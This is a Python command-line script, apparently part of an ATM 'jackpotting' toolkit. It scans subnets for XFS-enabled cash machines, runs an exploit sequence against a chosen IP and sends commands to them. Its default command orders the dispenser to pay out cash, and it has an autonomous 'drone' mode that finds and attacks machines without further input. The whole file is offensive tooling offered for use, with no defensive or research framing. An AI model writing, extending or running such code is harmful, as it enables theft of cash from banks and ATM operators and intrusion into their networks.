#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
remote_trigger.py - CLI remote trigger for jackpot drone
Can be called from anywhere via command line
"""

import json
import sys
import argparse
from network_xfs import RemoteXFSExploit, NetworkJackpotDrone

def main():
    parser = argparse.ArgumentParser(
        description='Remote ATM Jackpot Trigger - CLI Control',
        epilog='Examples:\n'
               '  python3 remote_trigger.py --scan\n'
               '  python3 remote_trigger.py --exploit -t 192.168.1.100\n'
               '  python3 remote_trigger.py -t 192.168.1.100 -c "cdm status"'
    )
    parser.add_argument('--target', '-t', help='Target IP address')
    parser.add_argument('--port', '-p', type=int, default=7777, help='XFS port (default: 7777)')
    parser.add_argument('--command', '-c', default='cdm dispense 100 20', help='XFS command to execute')
    parser.add_argument('--scan', '-s', action='store_true', help='Scan network for XFS targets')
    parser.add_argument('--exploit', '-e', action='store_true', help='Run full exploit sequence')
    parser.add_argument('--drone', '-d', action='store_true', help='Start autonomous drone mode')
    parser.add_argument('--stop', action='store_true', help='Stop autonomous drone')
    parser.add_argument('--web', '-w', action='store_true', help='Start web interface')
    parser.add_argument('--list', '-l', action='store_true', help='List discovered targets')
    parser.add_argument('--json', action='store_true', help='Output as JSON')
    parser.add_argument('--subnet', default='192.168.1.0/24', help='Subnet to scan (default: 192.168.1.0/24)')
    
    args = parser.parse_args()
    
    exploit = RemoteXFSExploit()
    
    # ============================================================
    # Scan Mode
    # ============================================================
    if args.scan:
        print(f"🔍 Scanning {args.subnet} for XFS devices...")
        atms = exploit.scan_subnet(args.subnet)
        if args.json:
            print(json.dumps(atms, indent=2))
        else:
            if atms:
                print(f"\n✅ Found {len(atms)} XFS devices:")
                for atm in atms:
                    print(f"  📡 {atm['ip']}:{atm['port']}")
            else:
                print("❌ No XFS devices found")
        return
    
    # ============================================================
    # Exploit Mode
    # ============================================================
    if args.exploit:
        if not args.target:
            print("❌ Error: --exploit requires --target")
            sys.exit(1)
        
        print(f"🚨 Exploiting {args.target}:{args.port}...")
        result = exploit.exploit_sequence(args.target, args.port)
        
        if args.json:
            print(json.dumps(result, indent=2))
        else:
            print("\n" + "=" * 60)
            print("JACKPOT SEQUENCE RESULTS")
            print("=" * 60)
            print(f"Target: {result['target']}:{result['port']}")
            print(f"Success: {'✅' if result['success'] else '❌'}")
            print(f"Dispensed: {result.get('amount_dispensed', 0)}")
            print("\nSteps:")
            for step in result['steps']:
                print(f"  > {step['command']}: {step['result'][:100]}...")
            print("=" * 60)
        return
    
    # ============================================================
    # Drone Mode
    # ============================================================
    if args.drone:
        print(f"🚀 Starting autonomous drone on {args.subnet}")
        drone = NetworkJackpotDrone()
        try:
            drone.start_autonomous_scan(args.subnet)
        except KeyboardInterrupt:
            print("\n🛑 Drone stopped by user")
            drone.stop()
        return
    
    if args.stop:
        print("🛑 Stopping drone...")
        print("⚠️ Use web interface to stop drone, or kill the process")
        return
    
    # ============================================================
    # Web Interface
    # ============================================================
    if args.web:
        from web_interface import run_web_server
        print("🌐 Starting web interface...")
        run_web_server()
        return
    
    # ============================================================
    # List Targets
    # ============================================================
    if args.list:
        # Try to load from database or file
        try:
            with open('/tmp/jackpot_targets.json', 'r') as f:
                targets = json.load(f)
            if args.json:
                print(json.dumps(targets, indent=2))
            else:
                print("🎯 Discovered Targets:")
                for t in targets:
                    print(f"  📡 {t}")
        except:
            print("❌ No targets found. Run --scan first.")
        return
    
    # ============================================================
    # Simple Command Mode
    # ============================================================
    if args.target:
        if args.json:
            result = exploit.execute_remote_command(args.target, args.port, args.command)
            print(json.dumps({'command': args.command, 'result': result}))
        else:
            print(f"💻 Executing on {args.target}:{args.port}: {args.command}")
            result = exploit.execute_remote_command(args.target, args.port, args.command)
            print(f"\n📤 Result:\n{result}")
        return
    
    # ============================================================
    # No arguments - show help
    # ============================================================
    parser.print_help()

if __name__ == '__main__':
    main()
